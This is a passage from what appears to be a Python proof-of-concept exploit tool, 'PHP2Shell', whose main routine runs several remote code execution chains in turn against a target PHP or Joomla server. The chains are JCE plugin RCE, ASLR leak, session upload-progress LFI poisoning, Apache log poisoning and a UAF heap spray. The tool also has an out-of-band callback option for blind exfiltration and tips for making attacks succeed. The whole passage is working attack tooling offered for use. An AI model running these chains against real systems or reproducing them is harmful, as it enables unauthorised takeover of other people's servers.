    # Heap geometry
    p.add_argument("--spray",  type=int, default=SPRAY_DEFAULT, help="UAF spray field count")
    p.add_argument("--chunk1", type=int, default=FILL_DEFAULT,  help="Phase-1 fill size")

    # OOB
    p.add_argument("--oob", default=None, help="OOB callback URL for blind exfil")

    # TLS
    p.add_argument("--https", action="store_true", help="Force HTTPS")

    args = p.parse_args()
    use_tls = args.https or args.port == 443
    scheme  = "https" if use_tls else "http"

    print("=" * 62)
    print("  PHP2Shell — Multi-Chain RCE  (Is4yev/php2shell-poc v2.0)")
    print("  CVE-2026-109618 / CVE-2026-109619")
    print("=" * 62)
    print(f"  Target : {scheme}://{args.host}:{args.port}{args.path}")
    print(f"  CMD    : {args.cmd}")
    print(f"  Chain  : {args.chain}")
    print()

    if args.chain == "jce" or (args.chain == "auto" and
                                 probe_jce(args.host, args.port, args.path, use_tls)):
        print("[*] Chain: JCE (CVE-2026-48907) — Joomla unauthenticated RCE")
        out = jce_chain(args.host, args.port, args.path, use_tls, args.cmd)
        if out:
            _print_rce(out, args.cmd, "jce")
            return
        if args.chain == "jce":
            print("[-] JCE chain failed.")
            return
        print("[~] JCE chain failed, trying next...")

    if args.chain in ("aslr-leak", "auto"):
        print("[*] Chain: ASLR-HTTP-Leak (PHP 8.x prefork mod_php)")
        ok = run_aslr_leak(args.host, args.port, args.path, use_tls,
                            args.cmd, args.ver, args.stall, args.spray)
        if ok:
            return
        if args.chain == "aslr-leak":
            return
        print("[~] ASLR-leak chain failed, trying next...")

    if args.chain in ("session-lfi", "auto"):
        print("[*] Chain: Session-LFI (upload_progress poison → include session file)")
        out = session_lfi_chain(args.host, args.port, args.path, use_tls,
                                 args.cmd, args.stall)
        if out:
            _print_rce(out, args.cmd, "session-lfi")
            return
        if args.chain == "session-lfi":
            print("[-] Session-LFI chain failed.")
            return
        print("[~] Session-LFI chain failed, trying next...")

    if args.chain in ("log-poison", "auto"):
        print("[*] Chain: Log-Poison (User-Agent PHP inject → LFI Apache log)")
        out = log_poison_chain(args.host, args.port, args.path, use_tls, args.cmd)
        if out:
            _print_rce(out, args.cmd, "log-poison")
            return
        if args.chain == "log-poison":
            print("[-] Log-poison chain failed.")
            return
        print("[~] Log-poison chain failed, trying next...")

    if args.chain in ("uaf", "auto"):
        print("[*] Chain: UAF heap spray (blind)" if args.blind or args.chain == "auto"
              else "[*] Chain: UAF heap spray")
        blind = args.blind or (args.chain == "auto" and args.dtor is None)
        retry = args.retry if args.retry != 10 else 30  # more retries in auto
        ok = run_uaf(args.host, args.port, args.path, use_tls,
                     args.cmd, args.dtor, blind, args.ver, args.stall,
                     retry, args.spray, args.chunk1, args.oob)
        if ok:
            return

    print(f"\n[-] All chains exhausted without RCE.")
    print("    Tips:")
    print("    • Supply --dtor <leaked_addr> for UAF precise mode")
    print("    • Verify session.upload_progress.enabled=On for session-lfi/uaf")
    print("    • Try --chain aslr-leak on PHP 8.x prefork with display_errors=On")
    print("    • Try --chain jce on Joomla targets with JCE plugin")


if __name__ == "__main__":
    main()
